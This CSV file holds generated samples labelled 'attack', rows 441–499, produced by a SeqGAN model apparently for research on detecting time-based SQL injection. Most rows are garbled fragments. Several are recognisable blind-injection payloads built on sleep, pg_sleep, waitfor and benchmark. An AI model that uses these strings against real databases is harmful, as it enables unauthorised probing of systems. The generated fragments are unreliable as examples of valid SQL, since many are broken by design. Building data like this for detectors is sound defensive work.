label,payload,family,payload_type,method,run_id,sample_index
attack,"1'||  (  select 'a""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,441
attack,1' pg_sleep  6272  sleep  (  select delay,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,442
attack,"f   )   ""  )   rlike sleep  (  5  )   and   (  ""ltE  (  ))    4287 *",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,443
attack,"""  )   or --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,444
attack,1    '   )    or '0:0:2' 8514 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,445
attack,"'   zxlrkci5tEo   sleep  (  x,md5  50  (   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,446
attack,0case'        n    (  select e(  5   )   ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,447
attack,"raa""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""l'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,448
attack,'   )    ) berpmrer_y    )   waitfor,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,449
attack,0x694a474577398594__T_  m______benchmark  select,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,450
attack,1'||  (  select '%%is7260et+xnet,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,451
attack,",or --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,452
attack,"1%% x""e'  =  'rr5 ( r  sleep  5dqmd5  (  5   )    or from not  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,453
attack,rC'sa',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,454
attack,1%'  =  )   or or 9443,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,455
attack,"""   )    or from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,456
attack,1 4287,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,457
attack,(  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,458
attack,"' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,459
attack,=  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,460
attack, where  from @ieono)aswhereerotote    )  or   (  benchmark  )    waitfor,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,461
attack,'isintegratedsecurityonly'    or( * --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,462
attack,   aise)   hwaitfor --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,463
attack,"ubxbei0  (  )   and not  select i sleep  (    5873,2840  (  5   jd0u'enpn'or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,464
attack,where 8466  select  (  _*--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,465
attack,"$,waitfor",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,466
attack,)   or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,467
attack,"1%""   )    a   waitfor% not  (   )    )    waitforand 4240  (  selectnot  3114mosleep  (  5   )    end   #or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,468
attack,"1 or pg_sleep(    (  (  (  selectl esleep  (  (  5873  5 pg_sleep_TIM5873_____TIME_____T_T3114    (  E,( 2657  5  )   0)lor where  and  sleep  (  5   ore",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,469
attack,1'   )--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,470
attack,7739or ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,471
attack,"1   0x4c4d6142a    as    ),benchmarkroe   pg_sleep  (  'isintegratedsecurityonly'   )    )    )   orsleep  (  3114",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,472
attack,"k{axwherey%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,473
attack," 4240 ""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  "" sleep  (  TIME_____TIME_TI_sn  5  )   )   or ((",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,474
attack,akwhere *   )    or sleep  (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,475
attack,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%hofahq sleep  ME____TD__T(   0x694a4745TIM_  0x6d457153   aaseromsetct_  )    )   or      )   or waitfor pg_sleep  (  )  5and   select * 6784  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,476
attack,"""  =  ""    _or'sa'e",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,477
attack,'  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,478
attack,""" or from  waitfor,u 9443 pg_sleep  55  =  5   )   anda0kaser   =   )   like where pg_sleep  (_________  3885(  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,479
attack,"1'   )        asve7260pdvd5__  select * from  pg_sleep  (  l,,rr5  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,480
attack,"   )    or and pg_sleepemdpg_sleep  _  3114(  select pg_sleep  (      ,ME___TI__  5   )    g where   from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,481
attack,"  )    )    and delay benchmark sleep  E__TIME____TIME_____TIME__,m(  ,5   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,482
attack,'||  (  select 'L25,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,483
attack,"1%""   ;io<>ltet10000000faa     =   <> where=bsiasoon@meqwaitfor where  =  =_Tu__TIMsleep  (  (  M'   (( (   3885riwheres n(  select delay  =  (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,484
attack,"%n""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""'  =  '    t",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,485
attack,"""   <> 0not  (  select   )   delay)   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,486
attack,"z1%""  )   rlike sleep  (  5  )   and   (  ""[""   )    )    or sleep  (  __TIME__  )    =  ""k delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,487
attack,"1' or 1361  ,sleep  (  5   select )      --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,488
attack,"itu""aa",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,489
attack,1'||  (  select ''nsi end1 where pg_sleep  (  5     5   waitfor --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,490
attack,1  6866,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,491
attack,"1%'||  (  select 'if10%""   or benchmark  (  )     ,#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,492
attack,"rt1361""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,493
attack,sleep eiq1  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,494
attack,"1'||  (  select 'RBe""   )    )    or sleep  (  __TIME__  )    =  ""rverppe  my  (  )    or ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,495
attack,"n' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'   0x544d5a4c""   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,496
attack,; and ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,497
attack,"1%""  ;  and  5  waitfor(  sleep  6784--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,498
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  """"  )   rlike sleep  (  5  )   and   (  ""'||  (  select 's{;;  '0:0:2't--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,499
